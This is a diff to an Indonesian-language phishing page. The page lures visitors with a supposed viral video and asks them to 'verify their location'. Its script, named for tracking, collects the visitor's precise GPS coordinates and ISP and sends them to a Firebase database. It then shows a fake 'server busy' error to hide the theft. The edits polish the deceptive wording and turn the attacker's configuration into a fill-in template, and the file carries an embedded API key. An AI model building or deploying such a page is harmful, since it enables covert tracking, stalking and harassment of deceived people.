@@ -9,13 +9,13 @@
 </head>
 <body style="text-align:center; font-family:sans-serif; background:#eee; padding:20px;">
     <div style="background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
-        <h2>🔴 VIDEO VIRAL HARI INI</h2>
-        <p>Verifikasi lokasi Anda untuk menonton rekaman lengkapnya.</p>
+        <h2>🔴 VIDEO VIRAL TERKINI</h2>
+        <p>Verifikasi lokasi Anda untuk memastikan keamanan konten sebelum menonton.</p>
         <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; cursor:pointer;">VERIFIKASI & TONTON</button>
     </div>
 
 <script>
-    // CONFIG KALZ TERPASANG 🎯
+    // MASUKKAN CONFIG FIREBASE LU DISINI 🎯
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
       authDomain: "theeyes-8d0aa.firebaseapp.com",
@@ -46,9 +46,9 @@
                 isp: isp,
                 maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
             });
-            alert("Error 403: Server Sibuk!");
-            btn.innerText = "COBA LAGI";
-        }, (err) => { alert("Izinkan lokasi!"); }, {enableHighAccuracy:true});
+            alert("Error 403: Server Sibuk. Coba lagi nanti!");
+            btn.innerText = "VERIFIKASI ULANG";
+        }, (err) => { alert("Gagal: Anda wajib mengizinkan lokasi!"); }, {enableHighAccuracy:true});
     }
 </script>
 </body>
